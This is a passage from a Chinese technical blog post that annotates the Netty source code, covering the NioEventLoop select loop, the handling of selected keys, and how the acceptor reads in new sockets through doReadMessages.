                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isShuttingDown()) {
                    closeAll();
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (confirmShutdown()) {
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                    }
                }
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                handleLoopException(t);
            }
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; select, 事件循环的依据&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; select(&lt;span&gt;boolean&lt;/span&gt; oldWakenUp) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException {
        Selector selector &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.selector;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; selectCnt = 0&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; currentTimeNanos =&lt;span&gt; System.nanoTime();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 带超时限制, 默认最大超时1s, 但当有延时任务处理时, 以它为标准&lt;/span&gt;
            &lt;span&gt;long&lt;/span&gt; selectDeadLineNanos = currentTimeNanos +&lt;span&gt; delayNanos(currentTimeNanos);

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (;;) {
                &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; timeoutMillis = (selectDeadLineNanos - currentTimeNanos + 500000L) / 1000000L&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (timeoutMillis &amp;lt;= 0&lt;span&gt;) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 超时则立即返回&lt;/span&gt;
                    &lt;span&gt;if&lt;/span&gt; (selectCnt == 0&lt;span&gt;) {
                        selector.selectNow();
                        selectCnt &lt;/span&gt;= 1&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }

                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If a task was submitted when wakenUp value was true, the task didn't get a chance to call
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Selector#wakeup. So we need to check task queue again before executing select operation.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If we don't, the task might be pended until select operation was timed out.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; It might be pended until idle timeout if IdleStateHandler existed in pipeline.&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (hasTasks() &amp;amp;&amp;amp; wakenUp.compareAndSet(&lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)) {
                    selector.selectNow();
                    selectCnt &lt;/span&gt;= 1&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }

                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; selectedKeys =&lt;span&gt; selector.select(timeoutMillis);
                selectCnt &lt;/span&gt;++&lt;span&gt;;

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (selectedKeys != 0 || oldWakenUp || wakenUp.get() || hasTasks() ||&lt;span&gt; hasScheduledTasks()) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - Selected something,
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - waken up by user, or
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - the task queue has a pending task.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; - a scheduled task is ready for processing&lt;/span&gt;
                    &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (Thread.interrupted()) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Thread was interrupted so reset selected keys and break so we not run into a busy loop.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; As this is most likely a bug in the handler of the user or it's client library we will
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; also log it.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2426&lt;/span&gt;
                    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.isDebugEnabled()) {
                        logger.debug(&lt;/span&gt;&quot;Selector.select() returned prematurely because &quot; +
                                &quot;Thread.currentThread().interrupt() was called. Use &quot; +
                                &quot;NioEventLoop.shutdownGracefully() to shutdown the NioEventLoop.&quot;&lt;span&gt;);
                    }
                    selectCnt &lt;/span&gt;= 1&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }

                &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; time =&lt;span&gt; System.nanoTime();
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (time - TimeUnit.MILLISECONDS.toNanos(timeoutMillis) &amp;gt;=&lt;span&gt; currentTimeNanos) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; timeoutMillis elapsed without anything selected.&lt;/span&gt;
                    selectCnt = 1&lt;span&gt;;
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (SELECTOR_AUTO_REBUILD_THRESHOLD &amp;gt; 0 &amp;amp;&amp;amp;&lt;span&gt;
                        selectCnt &lt;/span&gt;&amp;gt;=&lt;span&gt; SELECTOR_AUTO_REBUILD_THRESHOLD) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The selector returned prematurely many times in a row.
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Rebuild the selector to work around the problem.&lt;/span&gt;
&lt;span&gt;                    logger.warn(
                            &lt;/span&gt;&quot;Selector.select() returned prematurely {} times in a row; rebuilding Selector {}.&quot;&lt;span&gt;,
                            selectCnt, selector);

                    rebuildSelector();
                    selector &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.selector;

                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Select again to populate selectedKeys.&lt;/span&gt;
&lt;span&gt;                    selector.selectNow();
                    selectCnt &lt;/span&gt;= 1&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                }

                currentTimeNanos &lt;/span&gt;=&lt;span&gt; time;
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (selectCnt &amp;gt;&lt;span&gt; MIN_PREMATURE_SELECTOR_RETURNS) {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.isDebugEnabled()) {
                    logger.debug(&lt;/span&gt;&quot;Selector.select() returned prematurely {} times in a row for Selector {}.&quot;&lt;span&gt;,
                            selectCnt &lt;/span&gt;- 1&lt;span&gt;, selector);
                }
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (CancelledKeyException e) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.isDebugEnabled()) {
                logger.debug(CancelledKeyException.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;.getSimpleName() + &quot; raised by a Selector {} - JDK bug?&quot;&lt;span&gt;,
                        selector, e);
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Harmless exception - log anyway&lt;/span&gt;
&lt;span&gt;        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　大体来说就是：eventloop是一个一直在运行的线程，它会不停地检测是否发生了网络事件或者被提交上来了新任务，如果有那么就会去执行这些任务。&lt;/p&gt;
&lt;p&gt;　　在处理io事件和task时，为防止调度的饥饿问题，它设置了一个ioRatio来避免发生。即如果io事件占用了ioTime时间，那么task也应该占用相应剩下比例的时间，以保持公平性。&lt;/p&gt;
&lt;p&gt;　　在实现上，发现网络io事件是通过 selector.select()的，而发现task任务是通过 hasTasks()来实现检测的。每检测一次，一般不超过1s的休眠时间，以免在特殊情况下发生意外而导致系统假死。&lt;/p&gt;

&lt;h3&gt;2. acceptor 运行io操作&lt;/h3&gt;
&lt;p&gt;　　io操作主要就是监控一些网络事件，比如新连接请求，请请求，写请求，关闭请求等。它是一个网络应用的非常核心的功能之一。从eventloop的核心循环中，我们看到其 processSelectedKeys() 就做网络io事件处理的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.NioEventLoop#processSelectedKeys&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; processSelectedKeys() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; selectedKeys 为前面进行bind()时初始化掉的，所以不会为空&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (selectedKeys != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            processSelectedKeysOptimized();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            processSelectedKeysPlain(selector.selectedKeys());
        }
    }
    
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; processSelectedKeysOptimized() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当无网络事件发生时，selectedKeys.size=0, 不会发生处理行为&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; selectedKeys.size; ++&lt;span&gt;i) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 当有网络事件发生时，selectedKeys 为各就绪事件&lt;/span&gt;
            &lt;span&gt;final&lt;/span&gt; SelectionKey k =&lt;span&gt; selectedKeys.keys[i];
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; null out entry in the array to allow to have it GC'ed once the Channel close
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2363&lt;/span&gt;
            selectedKeys.keys[i] = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Object a =&lt;span&gt; k.attachment();

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (a &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; AbstractNioChannel) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 转换成相应的channel, 调用&lt;/span&gt;
&lt;span&gt;                processSelectedKey(k, (AbstractNioChannel) a);
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
                NioTask&lt;/span&gt;&amp;lt;SelectableChannel&amp;gt; task = (NioTask&amp;lt;SelectableChannel&amp;gt;&lt;span&gt;) a;
                processSelectedKey(k, task);
            }

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (needsToSelectAgain) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; null out entries in the array to allow to have it GC'ed once the Channel close
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2363&lt;/span&gt;
                selectedKeys.reset(i + 1&lt;span&gt;);

                selectAgain();
                i &lt;/span&gt;= -1&lt;span&gt;;
            }
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 处理具体的socket&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; processSelectedKey(SelectionKey k, AbstractNioChannel ch) {
        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; AbstractNioChannel.NioUnsafe unsafe =&lt;span&gt; ch.unsafe();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt; 
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;k.isValid()) {
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; EventLoop eventLoop;
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                eventLoop &lt;/span&gt;=&lt;span&gt; ch.eventLoop();
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ignored) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If the channel implementation throws an exception because there is no event loop, we ignore this
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; because we are only trying to determine if ch is registered to this event loop and thus has authority
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to close ch.&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Only close ch if ch is still registered to this EventLoop. ch could have deregistered from the event loop
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and thus the SelectionKey could be cancelled as part of the deregistration process, but the channel is
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; still healthy and should not be closed.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/5125&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (eventLoop != &lt;span&gt;this&lt;/span&gt; || eventLoop == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; close the channel if the key is not valid anymore&lt;/span&gt;
&lt;span&gt;            unsafe.close(unsafe.voidPromise());
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 取出就绪事件类型进行判断&lt;/span&gt;
            &lt;span&gt;int&lt;/span&gt; readyOps =&lt;span&gt; k.readyOps();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We first need to call finishConnect() before try to trigger a read(...) or write(...) as otherwise
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the NIO JDK channel implementation may throw a NotYetConnectedException.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果是连接事件，则先进行连接操作，触发 finishConnect() 事件链&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_CONNECT) != 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; remove OP_CONNECT as otherwise Selector.select(..) will always return without blocking
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/924&lt;/span&gt;
                &lt;span&gt;int&lt;/span&gt; ops =&lt;span&gt; k.interestOps();
                ops &lt;/span&gt;&amp;amp;= ~&lt;span&gt;SelectionKey.OP_CONNECT;
                k.interestOps(ops);

                unsafe.finishConnect();
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Process OP_WRITE first as we may be able to write some queued buffers and so free memory.
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 如果是写事件，则强制channel写数据&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_WRITE) != 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Call forceFlush which will also take care of clear the OP_WRITE once there is nothing left to write&lt;/span&gt;
&lt;span&gt;                ch.unsafe().forceFlush();
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Also check for readOps of 0 to workaround possible JDK bug which may otherwise lead
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to a spin loop&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != 0 || readyOps == 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 读取数据, OP_READ, OP_ACCEPT 会进入到此处，事件处理从此开始&lt;/span&gt;
&lt;span&gt;                unsafe.read();
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (CancelledKeyException ignored) {
            unsafe.close(unsafe.voidPromise());
        }
    }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.AbstractNioMessageChannel.NioMessageUnsafe#read&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; read() {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此处断言，只有io线程本身才可以进行read()操作，如果被其他线程执行，那就是有问题的&lt;/span&gt;
            &lt;span&gt;assert&lt;/span&gt;&lt;span&gt; eventLoop().inEventLoop();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 取出config, Pipeline...&lt;/span&gt;
            &lt;span&gt;final&lt;/span&gt; ChannelConfig config =&lt;span&gt; config();
            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelPipeline pipeline =&lt;span&gt; pipeline();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 调用 allocator 分配接收内存, io.netty.channel.AdaptiveRecvByteBufAllocator.HandleImpl
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 并重置读取状态&lt;/span&gt;
            &lt;span&gt;final&lt;/span&gt; RecvByteBufAllocator.Handle allocHandle =&lt;span&gt; unsafe().recvBufAllocHandle();
            allocHandle.reset(config);

            &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt; closed = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            Throwable exception &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1. 初步读取数据&lt;/span&gt;
                        &lt;span&gt;int&lt;/span&gt; localRead =&lt;span&gt; doReadMessages(readBuf);
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localRead == 0&lt;span&gt;) {
                            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                        }
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localRead &amp;lt; 0&lt;span&gt;) {
                            closed &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                        }
                        allocHandle.incMessagesRead(localRead);
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通过allocHandle判定是否已读取数据完成&lt;/span&gt;
                    } &lt;span&gt;while&lt;/span&gt;&lt;span&gt; (allocHandle.continueReading());
                } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                    exception &lt;/span&gt;=&lt;span&gt; t;
                }

                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; size =&lt;span&gt; readBuf.size();
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; size; i ++&lt;span&gt;) {
                    readPending &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2. 事件通知: fireChannelRead(), accept() 之后的channel作为数据源传入pipeline中
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 此 pipeline 结构为 head -&amp;gt; ServerBootstrapAcceptor -&amp;gt; tail &lt;/span&gt;
&lt;span&gt;                    pipeline.fireChannelRead(readBuf.get(i));
                }
                readBuf.clear();
                allocHandle.readComplete();
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 事件通知: channelReadComplete()
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 注意，此时read操作极有可能还未完成，而此进进行 complete 操作是否为时过早呢？
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 是的,但是不用担心，eventLoop可以保证先提交的事件会先执行，所以这里就只管放心提交吧
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 这也是accept不会阻塞eventLoop的原因，即虽然大家同在 eventLoop 上，但是accept很快就返回了&lt;/span&gt;
&lt;span&gt;                pipeline.fireChannelReadComplete();

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (exception != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                    closed &lt;/span&gt;=&lt;span&gt; closeOnReadError(exception);

                    pipeline.fireExceptionCaught(exception);
                }

                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (closed) {
                    inputShutdown &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isOpen()) {
                        close(voidPromise());
                    }
                }
            } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if there is a readPending which was not processed yet.
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This could be for two reasons:
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelRead(...) method
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelReadComplete(...) method
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2254&lt;/span&gt;
                &lt;span&gt;if&lt;/span&gt; (!readPending &amp;amp;&amp;amp; !&lt;span&gt;config.isAutoRead()) {
                    removeReadOp();
                }
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上是处理一条io事件的大体流程:&lt;/p&gt;
&lt;p&gt;　　　　1. 调用 AdaptiveRecvByteBufAllocator 分配一个新的 ByteBuf, 用于接收新数据;&lt;br/&gt;　　　　2. 调用 doReadMessages() 转到 accept() 接收socket进来, 存入 ByteBuf 备用;&lt;br/&gt;　　　　3. 对接入的socket, 调用pipeline.fireChannelRead(), 处理读过程;&lt;br/&gt;　　　　4. 调用pipeline.fireChannelReadComplete() 方法，触发read完成事件;&lt;br/&gt;　　　　5. 异常处理;&lt;/p&gt;
&lt;p&gt;　　注意，当前运行的线程是在bossGroup中，它的pipeline是相对固定的，即只有head -&amp;gt; acceptor -&amp;gt; tail, 而我们的handler是在childGroup中的，所以我们只能再等等咯。&lt;/p&gt;
&lt;p&gt;　　下面我们就来细分解下这几个步骤！&lt;/p&gt;

&lt;h4&gt;2.1 acceptor 接入socket&lt;/h4&gt;
&lt;p&gt;　　在调用AdaptiveRecvByteBufAllocator, 分配一个新的 allocHandle 之后，就进行socket的接入，实际上就是调用 serverSocketChannel.accept() 方法， 初步读取数据。来看下！&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 处理预备 allocHandle, 以便进行判定是否数据读取完成
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.AbstractChannel.AbstractUnsafe#recvBufAllocHandle&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; RecvByteBufAllocator.Handle recvBufAllocHandle() {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (recvHandle == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                recvHandle &lt;/span&gt;=&lt;span&gt; config().getRecvByteBufAllocator().newHandle();
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; recvHandle;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 重置读取状态
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultMaxMessagesRecvByteBufAllocator.MaxMessageHandle#reset&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; reset(ChannelConfig config) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.config =&lt;span&gt; config;
            maxMessagePerRead &lt;/span&gt;=&lt;span&gt; maxMessagesPerRead();
            totalMessages &lt;/span&gt;= totalBytesRead = 0&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 通过allocHandle判定是否已读取数据完成
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.DefaultMaxMessagesRecvByteBufAllocator.MaxMessageHandle#continueReading()&lt;/span&gt;
&lt;span&gt;        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; continueReading() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; continueReading(defaultMaybeMoreSupplier);
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; continueReading(UncheckedBooleanSupplier maybeMoreDataSupplier) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; config.isAutoRead() &amp;amp;&amp;amp;&lt;span&gt;
                   (&lt;/span&gt;!respectMaybeMoreData || maybeMoreDataSupplier.get()) &amp;amp;&amp;amp;
                    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; accept 时, totalMessages = 1, 此条件必成立。
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 但totalBytesRead=0, 所以必然返回false, 还需要继续读数据&lt;/span&gt;
                   totalMessages &amp;lt; maxMessagePerRead &amp;amp;&amp;amp;&lt;span&gt;
                   totalBytesRead &lt;/span&gt;&amp;gt; 0&lt;span&gt;;
        }


    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; accept 新的socket&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; doReadMessages(List&amp;lt;Object&amp;gt; buf) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 也就是说, 对于netty而言, 是先知道有事件到来, 然后才去调用 accept() 方法的
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 而accept() 方法则是会阻塞当前线程的哟, 但此时select()已经唤醒, 所以也意味着数据已经准备就绪,此处将会立即返回了&lt;/span&gt;
        SocketChannel ch =&lt;span&gt; SocketUtils.accept(javaChannel());

        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ch != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 将当前注册的accept() 添加的buf结果中&lt;/span&gt;
                buf.add(&lt;span&gt;new&lt;/span&gt; NioSocketChannel(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, ch));
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; 1&lt;span&gt;;
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
            logger.warn(&lt;/span&gt;&quot;Failed to create a new channel from an accepted socket.&quot;&lt;span&gt;, t);

            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                ch.close();
